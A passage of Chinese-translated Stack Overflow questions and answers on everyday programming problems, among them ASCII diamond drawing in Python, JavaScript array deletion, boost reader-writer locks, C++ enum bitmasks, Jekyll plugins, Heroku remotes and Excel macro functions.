 #
 # #
#   #
 # #
  # 
```

什么是（4）？

如果仍然没有意义，请尝试设计一些您自己的递归形状，这些形状与您要弄清楚的形状有点相似（可能类似于我的第二个示例）。现在不要担心如何编码，只需担心输出应该是什么。然后查看模式并得出一个算法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T12:16:14.880

首先，逐行分析图形以识别不同类型的模式。

*   帽子，仅出现在顶线和底线。它是任意数量的空格，后跟三颗星。
*   构成图形垂直部分的墙。它是任意数量的空格，后跟一颗星，然后是任意数量的空格，然后是一颗星。
*   地板，形成图形的水平部分。它是任意数量的空格，后跟三颗星，然后是任意数量的空格，然后是三颗星。

我们可以编写一个函数来打印这些模式中的每一个。

```
def cap(spacesBefore):
    print " " * spacesBefore + "***"

def wall(spacesBefore, spacesBetween):
    print " " * spacesBefore + "*" + " " * spacesBetween + "*"

def floor(spacesBefore, spacesBetween):
    print " " * spacesBefore + "***" + " " * spacesBetween + "***" 
```

接下来，编写将显示大小为 0、1 和 2 的图形的代码。这将使您了解如何显示任何大小的图形。

```
#size 0
cap(0)
wall(0,1)
cap(0)

print "\n"

#size 1
cap(2)
wall(2, 1)
floor(0, 1)
wall(0, 5)
floor(0, 1)
wall(2, 1)
cap(2)

print "\n"

#size 2
cap(4)
wall(4, 1)
floor(2, 1)
wall(2, 5)
floor(0, 5)
wall(0, 9)
floor(0, 5)
wall(2, 5)
floor(2, 1)
wall(4, 1)
cap(4) 
```

输出：

```
***
* *
***

  ***
  * *
*** ***
*     *
*** ***
  * *
  ***

    ***
    * *
  *** ***
  *     *
***     ***
*         *
***     ***
  *     *
  *** ***
    * *
    *** 
```

分析用于制作这些数字的代码，一些模式变得明显。对于大小为 N 的图形：

*   两个端盖前面都有 N*2 个空格。
*   有2*N+1条墙线。
*   有2*N条地板线。
*   该图的前半部分和后半部分是镜像。
*   每条墙线的前面空格数从 N*2 开始，然后缩小 2 直到达到零；然后它再次增长 2，直到再次达到 N*2。
*   墙之间的空间数量从 1 开始，然后增加 4，直到达到 4*N+1；然后它再次缩小 4 直到再次达到 1。
*   每层前面的空格数从 2N-2 开始，然后缩小 2 直到为零；然后它再次增长 2，直到再次达到 2N-2。
*   楼层之间的空间数量从1开始，增加4，直到达到4*N-3；然后它再次缩小 4 直到再次达到 1。

图案全部以线性速率增长和收缩，然后以线性速率收缩和增长。这意味着我们应该使用两个`for`条件相反的循环，并为帽子和中心墙添加一些额外的代码。

```
def draw(N):
    cap(2*N)
    for i in range(N):              #loop from 0 to N-1
        wall(2*(N-i), 1+(4*i))
        floor(2*(N-i-1), 1+(4*i))
    wall(0, 4*N+1)
    for i in range(N-1, -1, -1):    #loop from N-1 to 0
        floor(2*(N-i-1), 1+(4*i))
        wall(2*(N-i), 1+(4*i))
    cap(2*N) 
```

现在测试代码。

```
for i in range(7,10):
    draw(i)
    print "\n" 
```

输出：

```
 ***
              * *
            *** ***
            *     *
          ***     ***
          *         *
        ***         ***
        *             *
      ***             ***
      *                 *
    ***                 ***
    *                     *
  ***                     ***
  *                         *
***                         ***
*                             *
***                         ***
  *                         *
  ***                     ***
    *                     *
    ***                 ***
      *                 *
      ***             ***
        *             *
        ***         ***
          *         *
          ***     ***
            *     *
            *** ***
              * *
              ***

                ***
                * *
              *** ***
              *     *
            ***     ***
            *         *
          ***         ***
          *             *
        ***             ***
        *                 *
      ***                 ***
      *                     *
    ***                     ***
    *                         *
  ***                         ***
  *                             *
***                             ***
*                                 *
***                             ***
  *                             *
  ***                         ***
    *                         *
    ***                     ***
      *                     *
      ***                 ***
        *                 *
        ***             ***
          *             *
          ***         ***
            *         *
            ***     ***
              *     *
              *** ***
                * *
                ***

                  ***
                  * *
                *** ***
                *     *
              ***     ***
              *         *
            ***         ***
            *             *
          ***             ***
          *                 *
        ***                 ***
        *                     *
      ***                     ***
      *                         *
    ***                         ***
    *                             *
  ***                             ***
  *                                 *
***                                 ***
*                                     *
***                                 ***
  *                                 *
  ***                             ***
    *                             *
    ***                         ***
      *                         *
      ***                     ***
        *                     *
        ***                 ***
          *                 *
          ***             ***
            *             *
            ***         ***
              *         *
              ***     ***
                *     *
                *** ***
                  * *
                  *** 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-27T19:05:27.453

要找到图案，您可以想象[乌龟](http://docs.python.org/library/turtle.html)将如何绘制它。例如，要绘制：

```
***
* *
*** 
```

乌龟可以按照以下说明进行操作：

*   右转，前进
*   右转，前进
*   右转，前进
*   右转，前进

作为 Python 程序：

```
import turtle

turtle.right(90); turtle.forward(50)
turtle.right(90); turtle.forward(50)
turtle.right(90); turtle.forward(50)
turtle.right(90); turtle.forward(50)
turtle.exitonclick() # leave GUI open until a click 
```

如果我们将“右转”缩写为`'r'`“向前”，`"f"`则说明如下：

```
'rfrfrfrf' 
```

很容易看出它是`'rf' * 4`。遵循相同的程序：

```
 ***  
  * *  
*** ***
*     *
*** ***
  * *  
  *** 
```

指令是`'rflfrfrflfrfrflfrfrflfrf'`或`'rflfrf' * 4`，`'l'`代表“左转”。

`n`描述等于`0`和的两种情况的规则`1`是：

```
("rf" + "lfrf" * n) * 4 
```

即，如果`n = 0`那么它是`'rf' * 4`，如果`n = 1`那么它是`('rf' + 'lfrf') * 4`。要检查公式，您可以绘制它`n = 2`并将其与已知答案进行比较：

```
 ***    
    * *    
  *** ***  
  *     *  
***     ***
*         *
***     ***
  *     *  
  *** ***  
    * *    
    *** 
```

作为 Python 程序：

```
from turtle import Turtle

def get_romb_program(n):
    assert n >= 0
    side = "rf" + "lfrf" * n
    program = side * 4  # romb has 4 sides
    return program

def draw(turtle, n):
    assert 0 <= n < 101
    commands = {'r': lambda t: t.right(90),  # turn right
       'l': lambda t: t.left(90),  # turn left
       'f': lambda t: t.forward(2)
    }
    run(get_romb_program(n), turtle, commands)

def run(program, t, commands):
    for c in program:
        commands[c](t)

n = 2
t = Turtle()
scr = t.getscreen()
scr.xscale, scr.yscale = [101 // (n + 1)] * 2
draw(t, n)
scr.exitonclick() 
```

要将其打印为 ascii 艺术，您可以使用`AsciiTurtle`而不是`turtle.Turtle`：

```
class AsciiTurtle(object):
    def __init__(self):
        self.path = [(0, 0)]
        self.direction = (1, 0)

    def forward(self, distance):
        x, y = self.path[-1]
        for i in range(1, distance + 1):
            self.path.append((x + self.direction[0] * i,
                              y + self.direction[1] * i))

    def right(self, angle_ignored):  # 90 degree turn right
        self.direction = self.direction[1], -self.direction[0]

    def left(self, angle_ignored):  # 90 degree turn left
        self.direction = -self.direction[1], self.direction[0]

    def show(self):
        minx, maxx, maxy, miny = [f(xy[i] for xy in self.path)
                                  for i in [0, 1] for f in [min, max]]
        miny, maxy = -miny, -maxy  # upside-down
        board = [[' '] * (maxx - minx + 1) for _ in range(maxy - miny + 1)]
        for x, y in self.path:
            board[-y - miny][x - minx] = '*'
        print('\n'.join(''.join(row) for row in board)) 
```

### 例子

```
n = 5
t = AsciiTurtle()
draw(t, n) # defined above
t.show() 
```

### 输出

```
 ***          
          * *          
        *** ***        
        *     *        
      ***     ***      
      *         *      
    ***         ***    
    *             *    
  ***             ***  
  *                 *  
***                 ***
*                     *
***                 ***
  *                 *  
  ***             ***  
    *             *    
    ***         ***    
      *         *      
      ***     ***      
        *     *        
        *** ***        
          * *          
          *** 
```

# asp.net - 在 Microsoft Excel 中打开选择并从 ASP.NET Web 窗体应用程序发布回服务器。服务器上没有 SharePoint

> ID：13076197
> 
> 赞同：1
> 
> 时间：2012-10-25T19:54:37.230
> 
> 标签：asp.net, forms, excel, sharepoint, web

在 ASP.NET Web 窗体上，是否可以在 Excel 中打开选定的行、修改数据并将更改发布回服务器（类似于 Visual Studio TFS）？有哪些可用的技术？不幸的是，我不能为此使用 SharePoint。

# javascript - 当它包含javascript中的字符串时删除数组键

> ID：13076200
> 
> 赞同：-1
> 
> 时间：2012-10-25T19:54:45.750
> 
> 标签：javascript, arrays

我在 javascript 中有一个如下所示的数组：

`arr = ["md51234","md55234"]`

我正在尝试通过执行以下操作从中删除一个项目：

`delete arr["md51234"]`

但这似乎不起作用。有没有其他方法可以删除它？

@dystroy 提供了答案，我将 indexOf 添加到不兼容浏览器的数组原型中：

```
if (!Array.prototype.indexOf) {
    Array.prototype.indexOf = function(obj, start) {
         for (var i = (start || 0), j = this.length; i < j; i++) {
             if (this[i] === obj) { return i; }
         }
         return -1;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T19:55:35.183

您必须提供索引，而不是值：

```
delete arr[0]; 
```

或者，您也可以在大多数浏览器上使用[indexOf](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/indexOf)

```
delete arr[arr.indexOf("md51234")]; 
```

但请注意，删除不会使数组更短，它只会使值未定义。您使用后的阵列`delete`是

```
[undefined, "md55234"] 
```

如果要使数组更短，请使用

```
arr.splice(0, 1); // first parameter is index of element to remove, second one is number of elements to  remove 
```

这使得

```
["md55234"] 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-25T20:20:13.103

使用 jQuery 的不同方法：

```
arr = ["a", "b", "c", "d", "e"]; 
```

按索引删除项目：

```
arr = jQuery.grep(arr, function(value, index) {
    return index != 2;
}); 
```

按值删除项目：

```
arr = jQuery.grep(arr, function(value, index) {
    return value != "a";
}); 
```

# c++ - boost::unique_lock 和 boost::shared_lock 用于读写器锁

> ID：13076202
> 
> 赞同：5
> 
> 时间：2012-10-25T19:54:47.560
> 
> 标签：c++, multithreading, boost

我们已经实现了一个读写器锁

```
 typedef boost::unique_lock<boost::shared_mutex> WriterLock;
 typedef boost::shared_lock<boost::shared_mutex> ReadersLock; 
```

我们有许多多线程阅读器，而编写器只有几个。读取器与其他读取器共享访问权限，但阻止写入器。Writer 阻塞，直到它拥有对资源的独占访问权。

我们在 boost 文档中找不到这个......防止 Writer 饥饿的政策是什么？
例如，如果有很多读者都从一个线程池中敲锁，那么在作者最终获得锁之前，是否有任何保证尝试锁的次数上限？

我们看到的性能数据似乎表明写入必须等到根本没有读者，并且在极少数情况下这是很长时间，因为新读者可以在当前读者正在接受服务时请求锁定。在这种情况下，在我们的代码中，作者似乎必须等待很长时间，直到根本没有读取。

我们更喜欢类似队列的系统，当写入者请求锁定时，所有当前的读取器都会耗尽，但所有新进入的读取器都会阻塞在写入器请求之后。

Boost 中可升级锁概念的行为是什么？ [提升线程](http://www.boost.org/doc/libs/1_35_0/doc/html/thread/synchronization.html#thread.synchronization.mutex_concepts.upgrade_lockable)

它没有说明它如何处理作家饥饿。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-11-17T09:02:07.667

@Guerrero 解决方案的一个小改进，增加了多个读者和多个作者的公平性，因此没有人会饿死：

```
read() {
    while (atomic-write-requests > 0)
        condition.wait();
    ReadersLock lock(acquireReaderLock());
    doRead();
}
write() {
    while (atomic-write-requests > 0)
        condition.wait();
    atomic-write-requests++;
    WritersLock lock(acquireWriterLock());

    doWrite();
    atomic-write-requests--;
    condition.notify();
} 
```

在这个解决方案中，每当作者离开范围时，就会开始一场新的公平竞争。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:45:13.023

如果您想要的是一种先进先出方法，boost 在其状态图库上实现了几种调度策略（包括 FIFO）。我猜你将不得不调整你的很多代码来使用它。查看有关 fifo_scheduler 和 FifoWorker 的文档：

[http://www.boost.org/doc/libs/1_51_0/libs/statechart/doc/reference.html#FifoWorker](http://www.boost.org/doc/libs/1_51_0/libs/statechart/doc/reference.html#FifoWorker)

[http://www.boost.org/doc/libs/1_51_0/libs/statechart/doc/reference.html#fifo_scheduler.hpp](http://www.boost.org/doc/libs/1_51_0/libs/statechart/doc/reference.html#fifo_scheduler.hpp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:35:10.323

在不了解 boost 实现的情况下，也许您可​​以通过实现来防止 writer 饿死。当作家存在时，读者可以等待。也许像这样的伪代码：

```
read() {
    while (atomic-write-requests > 0) {
        condition.wait();
    }
    ReadersLock lock(acquireReaderLock());
    doRead();
}
write() {
    atomic-write-requests++;
    WritersLock lock(acquireWriterLock());

    doWrite();
    atomic-write-requests--;
    condition.notify();
} 
```

# c# - WebBrowser 通过 html 中的链接在内部存储的 html 资源之间导航

> ID：13076204
> 
> 赞同：2
> 
> 时间：2012-10-25T19:54:52.327
> 
> 标签：c#, browser

我们有几个 html 页面，我们将它们作为资源存储在我们的项目中。我们有一个显示内容的网络浏览器控件。我们的想法是用户可以使用 html 页面中的锚点 href 链接在其他内部 html 页面之间导航。

这可能吗？大多数内容将是静态的，而不是每次都从 Web 服务器下载，我们更愿意将其包含在应用程序中。我们还希望将其保留在应用程序中而不是提取出来以使其尽可能便携。

我看到了，这可以适应我们的场景吗？

```
private void webBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e) {
    // Redirect expertsexchange to stackoverflow
    if (e.Url.ToString().Contains("experts-exchange")) {
       e.Cancel = true;
       webBrowser1.Navigate("http://stackoverflow.com");
    }
} 
```

如果我认为目前这是可能的，那么我希望我会实现类似上面的东西，它会查看目标 URL，或者我必须给每个锚元素一个名称/唯一 ID。我想第一种方法会更容易实现。

想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T14:29:46.250

事实上，我的愚蠢是我烦恼的根源。我展示的代码效果很好，但我必须设置 webbrowser 控件的导航事件才能真正反映一些东西。简而言之，我有两个项目，test.html 和 test2.html 作为项目中包含的资源，然后我使用...

`if (e.Url.ToString().Contains("test2")) { e.Cancel = true; webBrowser1.DocumentText = WindowsFormsApplication1.Properties.Resources.test2.ToString(); }`

# javascript - 如何最大化窗口？

> ID：13076207
> 
> 赞同：1
> 
> 时间：2012-10-25T19:54:58.823
> 
> 标签：javascript, maximize, maximize-window

我遇到了这个麻烦，我想知道你是否可以帮助我。我试图在不显示任何按钮或工具栏的情况下最大化窗口，我希望它可以在尽可能多的浏览器中工作。

现在我可以用 IE 获得它，但我不能用 Chrome。我一直在这里寻找解决方案，但我没有发现任何类似的问题（如果是我很抱歉）。

我读过使用 jQuery 可能很容易，但我不知道。我更喜欢使用 JS 来做任何建议或帮助都将受到欢迎！

我正在使用它，但不适用于 Chrome ![在此处输入图像描述](../Images/5192da8271873e62d716807a69898447.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-08T20:13:22.403

你能做的最好的就是使用`window.resizeBy(x, y)`和`window.resizeTo(x, y)`

# javascript - $route 不适用于搜索网址

> ID：13076208
> 
> 赞同：1
> 
> 时间：2012-10-25T19:55:00.837
> 
> 标签：javascript, angularjs

我的路线示例：

```
angular.module('test', [], function ($routeProvider) {
$routeProvider.when('/', {
    templateUrl: 'pageOne.html',
    controller: ControllerOne
}).when('/?:foo, { templateUrl: '
pageTwo.html ', controller: ControllerTwo });` 
```

但是如果我加载像[http://example.com/?someFoo](http://example.com/?someFoo)这样的页面，我的路由不会加载 ControllerTwo，它会加载 ControllerOne。我做错了什么？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T21:55:42.173

我认为格式不正确。

```
angular.module('test', [], function ($routeProvider) {
$routeProvider.when('/', {
    templateUrl: 'pageOne.html',
    controller: 'ControllerOne'
}).when('/foo/:foo', { templateUrl: '
pageTwo.html ', controller: 'ControllerTwo' }); 
```

并加载像[http://example.com/#/foo/someFoo这样的页面](http://example.com/#/foo/someFoo)

我建议你有

```
.otherwise({ redirectTo: '/nosuchpage.html'}) 
```

然后你就会知道你的链接是否错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T23:47:48.673

您需要将控制器名称作为字符串传递

这有效

```
var myApp = angular.module('myApp',[],function($routeProvider) {        

    $routeProvider
        .when('/home',{templateUrl:'home.html'})
        .when('/page1',{templateUrl:'page1.html', controller:'ctrl1'})
        .when('/page2',{templateUrl:'page2.html', controller:'ctrl2'})
        .otherwise({redirectTo:'/home'});

});

function ctrl1($scope){
    $scope.something = 'Hello from page 1';
}
function ctrl2($scope){
    $scope.something = 'Hello from page 2';
} 
```

jsfiddle：http: [//jsfiddle.net/jaimem/T2TWB/1/](http://jsfiddle.net/jaimem/T2TWB/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T07:11:09.880

Angular 似乎不支持它。查看[https://groups.google.com/d/topic/angular/5l4bbnWp18M/discussion](https://groups.google.com/d/topic/angular/5l4bbnWp18M/discussion)

# c# - 迭代文件结构时更新进度条

> ID：13076209
> 
> 赞同：5
> 
> 时间：2012-10-25T19:55:01.787
> 
> 标签：c#, winforms, progress-bar, backgroundworker, file-search

我使用此功能搜索所选目录中的所有 exe 文件：

```
public static IEnumerable<string> GetFiles(string root, string searchPattern)
{
    Stack<string> pending = new Stack<string>();
    pending.Push(root);
    while (pending.Count != 0)
    {
        var path = pending.Pop();
        string[] next = null;
        try
        {
            next = Directory.GetFiles(path, searchPattern);
        }
        catch { }
        if (next != null && next.Length != 0)
            foreach (var file in next) yield return file;
        try
        {
            next = Directory.GetDirectories(path);
            foreach (var subdir in next) pending.Push(subdir);
        }
        catch { }
    }
} 
```

如何根据找到的文件数更新进度条状态？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:24:56.463

关键是你不知道你会发现的 exe 文件的总数（也就是 100%），所以基本上你不能渲染进度条！对于这种任务，它更适合沙漏或选框酒吧......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:07:37.550

也许我在这里遗漏了一些东西，但是为什么不将进度条的最大值分配给`pending.Count`每次处理文件时进度条的值加 1 呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T19:57:49.210

您可能想要搜索，然后将进度条最大值设置为找到的文件数。

您可以分配一个计数器，将值 a = 分配给找到的文件数，然后设置

进度条.最大值 = a;

# c++ - 函数采用枚举或枚举值组合的模式

> ID：13076210
> 
> 赞同：0
> 
> 时间：2012-10-25T19:55:01.460
> 
> 标签：c++, enums, bit-manipulation

假设我有这个：

```
enum E{ 
a,
b,
c,
total
}

class A {
char mask; // supposed to contains combinations of values of the enum, like a or c, etc
} 
```

是否有一个体面的解决方案以用户友好的方式构建对象 A？例如我可以这样做：

```
A(E e) {
mask = 1 << e;
} 
```

但这仅在您希望仅由枚举的 1 个元素制成时才有效 理想情况下，用户可以执行以下操作：

```
A* a = new A(a | c) 
```

这会自动创建

```
mask = 1 << a | 1 << c; 
```

关于如何正确执行此操作的任何想法？谢谢

**编辑**

可悲的是，我无法控制初始枚举，并且值以 1 递增 1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:15:42.433

为了维护类型并提供对按位`|`,的支持`&`，`^`我在宏中编写了以下运算符，并且通常在我的项目中的枚举类型上使用它们：

```
enum E {
    a = 1 << 0,
    b = 1 << 1,
    c = 1 << 2,
    total = a | b | c
};
E operator | (E lhs, E rhs ) {
    return static_cast<E>( static_cast<int>(lhs) | static_cast<int>(rhs) );
}
E operator & (E lhs, E rhs ) {
    return static_cast<E>( static_cast<int>(lhs) & static_cast<int>(rhs) );
}
E operator ^ (E lhs, E rhs ) {
    return static_cast<E>( static_cast<int>(lhs) ^ static_cast<int>(rhs) );
}
E operator ~ (E e ) {
    return static_cast<E>( ~static_cast<int>(e) );
}
E& operator |= (E& lhs, E rhs ) {
    return lhs = static_cast<E>( static_cast<int>(lhs) | static_cast<int>(rhs) );
}
E& operator &= (E& lhs, E rhs ) {
    return lhs = static_cast<E>( static_cast<int>(lhs) & static_cast<int>(rhs) );
}
E& operator ^= (E& lhs, E rhs ) {
    return lhs = static_cast<E>( static_cast<int>(lhs) ^ static_cast<int>(rhs) );
} 
```

现在你可能有：

```
void test( E e );
test( a | b );
E e = c;
e |= b;
e = e & d;
e ^= a;
e = ~e; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T19:59:24.153

嗯，有简单的方法和丑陋的方法。

简单的方法是将这些位定义为与存在不重叠，例如：

```
enum E
{ 
   a = 1 << 0,
   b = 1 << 1,
   c = 1 << 2,
   total = 1 << 3 // or a | b | c, not sure what the intent was
}; 
```

丑陋的方式：

```
#define MAKEA(x) (new A((E_helper() | x).get())) 
```

where`E_helper`是一个覆盖`operator|(enum E)`.

```
class E_helper
{
    unsigned accum;
public:
    explicit E_helper(unsigned initial = 0) : accum(initial) {}
    unsigned get() const { return accum; }
    E_helper operator|(enum E e) const { return E_helper(accum | (1 << (unsigned)e)); }
}; 
```

然后你的用户可以说

```
A* p = MAKEA(a | c); 
```

扩展到

```
A* p = (new A((A_helper() | a | c).get()); 
```

这导致了这一系列事件

```
A_helper.operator|(a).operator|(c).get() 
```

更好的是，将`.get()`调用移动到 A 的构造函数中，然后它接受一个类型为 的参数`A_helper`。这将让您捕捉到用户忘记使用`MAKEA`宏的情况。

但是请注意，**丑陋的方式会暴露出违反直觉的行为**。例如，`A* p = MAKEA(a | c);`不同于`A* p = MAKEA( (a | c) );`和`char mask = a | c; A* p = MAKEA(mask);`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T19:59:19.130

尝试

```
enum E{ 
a = 1,
b = 2,
c = 4,

} 
```

然后

```
A var(a | c) 
```

将工作

然后检查（说）`a`是否设置你使用`&`即`if (mask & a) ...`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:05:00.117

您需要从一组连续值生成位掩码。这很简单：

```
int mask(E e) {
    return 1 << e;
} 
```

现在您可以或掩码值一起调用您的函数：

```
A var(mask(a) | mask(b)); 
```

# java - 如何在不使用任何java内置函数的情况下在java中将数字转换为字符数组

> ID：13076211
> 
> 赞同：1
> 
> 时间：2012-10-25T19:55:01.630
> 
> 标签：java, algorithm, data-structures, recursion

我正在准备面试，但我无法解决其中一个问题。下面是问题：

> 不使用任何内置的java转换功能，将数字一个一个地打印为字符。下面的示例假设您有一个数字 1234，现在编写函数将此数字作为整数并打印字符数组 {1,2,3,4}。

它要求在不使用任何内置 java 转换的情况下编写此函数 如果有人知道如何解决它，请告诉我。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T20:01:04.027

暗示 ：

> 模数 10 给出最后一位
> 
> 整数除以 10 会删除其最后一位。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T19:58:06.777

逐位遍历数字并使用 switch-case 子句来决定必须将其映射到哪个字符。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:01:06.047

这是算法的大致思路，修改它以创建一个 char 数组而不是打印结果：

```
void printNumber(int n) {
    if (n < 10)
        System.out.println(n);
    else {
        printNumber(n / 10);
        System.out.println(n % 10);
    }
} 
```

我使用递归算法编写它，因为我喜欢递归......但是将其转换为迭代解决方案很简单。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:49:11.470

如果我们完全遵守限制，这是一个相当不错的练习。

这是我的解决方案：

```
static char[] getCharArrayFromInt(int value) {
    if (value == 0)
        return new char[]{'0'};
    if (value == Integer.MIN_VALUE)
        return new char[]{'-', '2', '1', '4', '7', '4', '8', '3', '6', '4', '8'};
    int signValue = 0;
    if (value < 0) {
        signValue = 1;
        value *= -1;
    }
    char[] result = new char[signValue + (int) (Math.log10(value) + 1)];
    // to be correct, we need a switch/function here. but for the length, lets reduce it
    if (signValue == 1)
        result[0] = '-';
    for (int i = result.length - 1; i >= 0 + signValue; --i) {
        result[i] = (char) ((value % 10) + '0');
        // to be correct, we need a switch here. but for the length, lets reduce it
        value /= 10;
    }
    return result;
} 
```

它两次违反了“不使用任何内置的java转换函数”，在源代码中标记。这只是为了缩短程序。为这部分编写一个带有开关的函数非常清晰易懂。

这些函数应该对整个整数范围有效。

但老实说，我不认为一个人可以在面试的 10 分钟内做出这个解决方案。你应该开始讨论编写干净的代码是最有回报的，以及为什么最好避免上面显示的这些事情。

--待定

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T20:14:15.337

```
public static void main(String[] args) {
    final int number = 500;
    final int base = 10; // the number system, in your case: decimal
    int tmp = number; // create a temporary variable for processing
    StringBuilder sb = new StringBuilder(); // create a buffer for your textual representation (or calc the length beforehand)
    //
    do {
        int digit = tmp % base; // get the last digit
        sb.append(digit); // attach it to your character buffer
        tmp /= base; // remove the numbers last digit
    } while (tmp != 0); // stop when there is no more character but when the number is 0, you have to execute it once
    sb.reverse(); // now flip the characters because it was written to from behind
    //
    String numText = sb.toString();
    System.out.println(numText);
    //
    char[] chars = numText.toCharArray();
    sb = new StringBuilder("{");
    for (int i = 0; i < chars.length; i++) {
        char c = chars[i];
        sb.append(c);
        if (i != chars.length - 1) {
            sb.append(", ");
        }
    }
    sb.append("}");
    //
    System.out.println(sb.toString());
} 
```

# ruby - Jekyll：如何将 Ruby 对象传递给模板？

> ID：13076213
> 
> 赞同：8
> 
> 时间：2012-10-25T19:55:04.527
> 
> 标签：ruby, jekyll, jekyll-extensions

例如，假设我想生成这个数组：

```
random_numbers = []
1000.times { random_numbers << rand(2) } 
```

并将其传递给模板，以便我可以从 Liquid 访问它：

```
{% for num in random_numbers %} 
  ... here I'd use logic around the number to generate something.
{% endfor %} 
```

注意：我想在 Ruby 中动态生成数组。在模板内部，我想要一个可以迭代的数组，我不想要一个字符串。

在 Jekyll 中如何做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-01T20:39:09.497

好吧，你需要一个插件：[https ://github.com/mojombo/jekyll/wiki/Plugins](https://github.com/mojombo/jekyll/wiki/Plugins)

如果您乐于将逻辑放入您的插件中，您可以在自定义 Liquid::Tag 中执行此操作，但您的要求听起来像是需要一个生成器，这没关系。我只是把它放在一起，它似乎可以按照你的意愿工作：

```
module Jekyll

class RandomNumberGenerator < Generator

  def generate(site)
    site.pages.each do |page|
      a = Array.new
      1000.times { a << rand(2) }
      page.data['random_numbers'] = a
    end
  end

end

end 
```

这应该放在你的 _plugins/ 目录中（如 rand.rb 或其他东西）。在您的模板中，您可以执行

```
<ul>
    {% for number in page.random_numbers %}
        <li>{{ number }}</li>
    {% endfor %}
</ul> 
```

或者任何你想要的。我假设您需要为每个页面设置一组不同的数字 - 但如果您需要为整个站点设置一组，您可以轻松地生成一次数组，然后将其附加到站点对象或每个页面。

这不适用于 Github Pages 上的自动生成（出于显而易见的原因，它们不允许自定义插件），但这应该不是问题 - 即使您使用的是 Github Pages，也有很多解决方法。

# heroku - heroku 无需克隆即可协作

> ID：13076215
> 
> 赞同：7
> 
> 时间：2012-10-25T19:55:14.987
> 
> 标签：heroku, clone, collaboration

我被邀请加入 heroku 合作。我收到了电子邮件：

> 由于您已经拥有 Heroku 帐户，因此您可以通过简单地 git 克隆应用程序存储库来开始：
> 
> git clone git@heroku.com:.....

其他合作者和我自己已经在推/拉到同一个 github 存储库，所以我已经有了代码的副本。

来自 Heroku 开发中心 (https://devcenter.heroku.com/articles/collab)：

> $ heroku git:clone -a APPNAME 这将创建一个名为 APPNAME 的目录，其中包含 git 存储库的完整副本。它还设置了一个名为 heroku 的 git 远程。

那么，我该怎么做才能将 git 远程设置为 heroku？我知道我可以转储我的副本并对其进行克隆，但我不想这样做。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T20:14:56.360

从现有的 git 目录中运行`heroku git:remote -a APPNAME`。

您也可以直接使用`git remote`-- 在 heroku 控制面板中查看您的应用程序以找到 git 地址。

我不建议将`heroku git:clone`其用作文档详细信息，因为就像您所做的那样，您应该使用单独的 git 托管服务提供商（例如 github）来实际管理您的源代码。

# excel - 将结构存储在excel单元格中？

> ID：13076218
> 
> 赞同：1
> 
> 时间：2012-10-25T19:55:19.913
> 
> 标签：excel, data-structures, excel-formula

大家好，

有没有办法在 Excel 单元格中存储数据结构？我将如何放置和从中获取数据？

我希望使用类似的东西

*   将结构放在单元格 A1 中：`=putstruct("data1", 123, "data2", "hello", "data3", MMULT(matA,matB))`*   从 A1 进入单元格 B1：`=getstruct("A1", "data1")`

用结构解决的一个（几个）问题：如果我需要引用一个计算矩阵，首先我必须在电子表格上展开（即显示）整个矩阵，然后将其命名为一个范围以开始使用它。但是，如果矩阵大小发生​​变化，那就开始令人头疼了……

任何帮助表示赞赏！

[顺便说一句，我在[这里](https://stackoverflow.com/questions/12162854/using-excel-add-ins-to-store-complex-structures-with-vba-in-excel)和[这里发现了类似的问题。](https://stackoverflow.com/questions/9575299/how-to-store-array-elements-in-an-excel-sheet-cells-with-tcl-tcom)]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T08:03:42.093

是的，它可以做到，但很复杂。
putstruct 需要将数据存储在某个内部全局数据池中，并带有句柄，并将句柄放到 A1 中的数据结构中。
然后 Getstruct 使用 A1 中的句柄返回数据。
所涉及的一些困难是：

使 GetStruct 在数据更改时正确返回数据，
将全局数据持久保存在保存的工作簿中，以便在打开工作簿时重新出现，当
带有句柄的单元格被覆盖或删除时清理全局数据

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T19:06:45.273

这可能对您有用...首先在新工作簿中运行此宏：

```
Sub AddMacroFunctions()
 Sheets.Add Type:=xlExcel4MacroSheet
 [B2] = "=ARGUMENT(""Name"",2)"
 [B3] = "=ARGUMENT(""Value"",95)"
 [B4] = "=RETURN(SET.NAME(Name,Value))"
 [B6] = "=RESULT(95)"
 [B7] = "=ARGUMENT(""Value"",95)"
 [B8] = "=RETURN(EVALUATE(Value))"
 Names.Add "Put", Range("B2"), , xlFunction
 Names.Add "Get", Range("B6"), , xlFunction
 ActiveSheet.Visible = False
End Sub 
```

...现在对于给定的示例，您可以在活动表上输入这些公式：

```
A1: =AND(Put("data1",123),Put("data2","hello"),Put("data3",MMULT({1;2},{3,4})))
B1: =IF(A1,Get("data1")) 
```

